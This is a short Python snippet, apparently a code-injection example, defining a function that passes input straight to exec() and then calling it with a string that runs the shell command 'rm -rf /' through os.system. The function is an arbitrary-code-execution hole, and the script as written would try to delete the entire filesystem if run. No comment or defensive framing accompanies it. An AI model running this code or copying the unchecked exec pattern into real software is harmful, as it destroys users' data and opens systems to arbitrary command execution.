
def execute_user_code(user_input):
    try:
        exec(user_input)
    except Exception as e:
        print(f"Error executing code: {e}")

user_input = "__import__('os').system('rm -rf /')"
execute_user_code(user_input)